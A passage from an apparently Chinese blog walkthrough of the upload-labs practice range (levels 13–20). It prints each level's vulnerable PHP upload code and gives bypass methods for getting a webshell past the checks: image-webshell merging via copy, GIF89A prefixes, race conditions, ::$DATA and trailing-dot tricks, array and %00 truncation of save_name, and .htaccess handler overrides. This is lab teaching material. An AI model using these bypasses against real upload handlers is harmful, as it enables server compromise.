fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过读取文件的前两个字节来判断文件类型，本关的目的是上传图片马，所以利用<strong>copy</strong>命令将图片文件和php文件进行合并成图片马文件，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b + 13cmd.php/a 13cmd.jpg</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后通过带有文件包含漏洞的文件检测图片马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用<strong>getimagesize</strong>函数获取文件类型是否是图片文件，跟上一关一样，可以用<strong>copy</strong>命令生成图片马，也可以在文件内容的开头加入<strong>GIF89A</strong>伪装成<strong>GIF</strong>文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样利用<strong>copy</strong>命令生成图片马或者在文件内容开头加入<strong>GIF89A</strong>即可上传图片马</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br></pre></td></tr></table></figure><p>这关规定了文件的后缀名必须是jpg，png或gif，文件类型<strong>Content-Type</strong>必须为image/jpeg，image/png或image/gif，而且上传后还经过<strong>imagecreatefromgif</strong>函数进行图片二次渲染的过程，我们可以先试着上传一个利用<strong>copy</strong>命令生成的图片马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到成功上传，接下来访问上传的图片马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出上传的图片马末尾的PHP代码经过二次渲染后发生了变化</p><p>二次渲染后的图片是会有部分内容不会发生变化的，我们可以试着上传一张完整的<strong>GIF</strong>图片，对比上传后的图片与原来的图片</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可以发现开头部分内容前后是没有变化的，那么我们就在开头部分直接添加PHP代码再上传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/32.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功上传，再利用文件包含漏洞访问一下上传的图片马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/33.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这个方法只适合gif图片，如果是png和jpg方法较为麻烦，具体可以参考<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关先经过<strong>move_uploaded_file</strong>函数进行文件上传，再利用白名单过滤文件，如果不是图片文件再通过<strong>unlink</strong>函数将文件删除，我们可以利用条件竞争的原理，利用多线程不断上传php文件，再后台还未来得及通过<strong>unlink</strong>函数删除php文件时，访问到webshell</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/34.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发包的同时在浏览器不断访问17cmd.php文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/35.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"./myupload.php"</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'size'</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH.<span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">'文件已经被上传，但没有重命名。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">'这个文件不能上传到服务器的临时文件存储目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传目录不可写。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，无法上传该类型文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传的文件过大。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，服务器已经存在相同名称文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">'文件无法上传，文件不能复制到目标目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">'未知错误！'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关同样使用了白名单的形式规定了合法的后缀名，上传后再通过<strong>rename</strong>函数重命名。我们可以观察这关的白名单中存在压缩包的后缀名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var $cls_arr_ext_accepted = array(</span><br><span class="line">      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,</span><br><span class="line">      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );</span><br></pre></td></tr></table></figure><p>那么跟上一关一样，我们可以利用条件竞争，通过多线程发送上传后缀名为<strong>.php.7z</strong>的文件的包，当服务器还未来得及将文件改名时访问上传的webshell</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/36.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到有的响应包的提示是文件还来不及被重命名</p><p>在浏览器中访问<strong>18cmd.php.7z</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/38.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功访问webshell</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关以一个POST方式传递的参数<strong>save_name</strong>作为上传文件保存的文件名，同时通过<strong>pathinfo</strong>函数对文件名的后缀名进行黑名单检测，但是我们可以发现，并没有对该参数进行一系列过滤处理（去点，去空，去::$DATA字符串，大小写转化）</p><p>我们先测试一下<strong>pathinfo</strong>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> pathinfo(<span class="string">"cmd.php"</span>,PATHINFO_EXTENSION); <span class="comment">#php</span></span><br><span class="line"><span class="keyword">echo</span> pathinfo(<span class="string">"cmd.php."</span>,PATHINFO_EXTENSION); <span class="comment">#</span></span><br><span class="line"><span class="keyword">echo</span> pathinfo(<span class="string">'cmd.php::$DATA'</span>,PATHINFO_EXTENSION); <span class="comment">#::$DATA</span></span><br><span class="line"><span class="keyword">echo</span> pathinfo(<span class="string">"cmd.php "</span>,PATHINFO_EXTENSION);<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>; <span class="comment">#php</span></span><br><span class="line"><span class="keyword">echo</span> pathinfo(<span class="string">"cmd.PHP"</span>,PATHINFO_EXTENSION);<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>; <span class="comment">#PHP</span></span><br></pre></td></tr></table></figure><p>通过测试说明，一系列之前关卡的绕过方法都是可以的</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/39.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/40.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">            <span class="comment">//mime check</span></span><br><span class="line">            $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">            <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">                $msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//check filename</span></span><br><span class="line">                $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">                <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">                    $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $ext = end($file);</span><br><span class="line">                $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">                <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">                    $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">                    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">                    $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">                    <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                        $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                        $is_upload = <span class="keyword">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这关首先检查了上传的文件类型，然后将POST方式传递的参数<strong>save_name</strong>（如果为空，则上传的文件名）作为文件名变量<strong>$file</strong>，对<strong>$file</strong>进行了是否是数组的判断，如果不是数组则以<strong>“.”</strong>为分界符打散成数组，并取出数组最后一个元素（通过<strong>end</strong>函数）作为文件名后缀进行白名单的检测，通过检测的话就取出数组的第一个元素（通过<strong>reset</strong>函数）与<strong>$file[count($file) - 1]</strong>拼接成最终的文件名上传</p><p>如果变量<strong>$file</strong>作为字符串，则我们只能上传图片马，但如果作为<strong>数组</strong>，则不需要经过<strong>explode</strong>函数的处理，那么我们就考虑对<strong>$file</strong>数组赋值如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="keyword">array</span>();</span><br><span class="line">$file[<span class="number">1</span>] = <span class="string">"20cmd"</span>;</span><br><span class="line">$file[<span class="number">2</span>] = <span class="string">"php"</span>;</span><br><span class="line">$file[<span class="number">3</span>] = <span class="string">"jpg"</span>;</span><br></pre></td></tr></table></figure><p>那么被检测的后缀名变量<strong>$ext</strong>和最后上传的文件名变量<strong>$file_name</strong>的值如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ext = end($file) == <span class="string">"jpg"</span></span><br><span class="line">$file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>] == <span class="string">"20cmd.php"</span></span><br></pre></td></tr></table></figure><p>上传的payload如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/41.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还可以考虑通过利用<strong>%00</strong>截断函数<strong>move_uploaded_file</strong>，对<strong>$file</strong>数组赋值如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="keyword">array</span>();</span><br><span class="line">$file[<span class="number">0</span>] = <span class="string">"20cmd.php "</span>; <span class="comment">//将最后一个空格字符" "在burp的提交包中的十六进制中替换成0x00</span></span><br><span class="line">$file[<span class="number">1</span>] = <span class="string">"jpg"</span>;</span><br></pre></td></tr></table></figure><p>上传的payload如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/42.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h2><p>文件上传的检查主要分为两大部分：<strong>客户端</strong>检查和<strong>服务器端</strong>检查</p><h3 id="一-客户端检查"><a href="#一-客户端检查" class="headerlink" title="一.客户端检查"></a>一.客户端检查</h3><p>客户端主要是通过前端的<strong>JS</strong>代码进行检查，如果只是单纯的前端检查，我们只需要按照前端的检查标准发送请求包，再通过抓包修改请求包的内容，如第一关，抓包修改一下文件名后缀再提交即可成功上传webshell</p><h3 id="二-服务器端检查"><a href="#二-服务器端检查" class="headerlink" title="二.服务器端检查"></a>二.服务器端检查</h3><p>服务器端则是通过后台脚本代码（本靶场为PHP）进行检查，检查主要分为三部分：检查<strong>Content-type</strong>，检查<strong>后缀名</strong>，检查<strong>文件内容</strong></p><h4 id="1-检查Content-type"><a href="#1-检查Content-type" class="headerlink" title="1.检查Content-type"></a>1.检查Content-type</h4><p>抓包修改Content-type字段为合法内容即可</p><h4 id="2-检查后缀名"><a href="#2-检查后缀名" class="headerlink" title="2.检查后缀名"></a>2.检查后缀名</h4><p>检查后缀名分为<strong>黑名单</strong>检测和<strong>白名单</strong>检测</p><h5 id="2-1黑名单检测"><a href="#2-1黑名单检测" class="headerlink" title="2.1黑名单检测"></a>2.1黑名单检测</h5><p>列举出一系列禁止上传的文件后缀名进行过滤，常用的绕过方法有以下几种：</p><p>（1）上传<strong>特殊可解析后缀</strong>：如<strong>phtml</strong>，<strong>php3</strong>，<strong>php5</strong>，<strong>pht</strong></p><p>（2）上传<strong>.htaccess</strong>文件：内容为<strong>SetHandler application/x-httpd-php</strong> 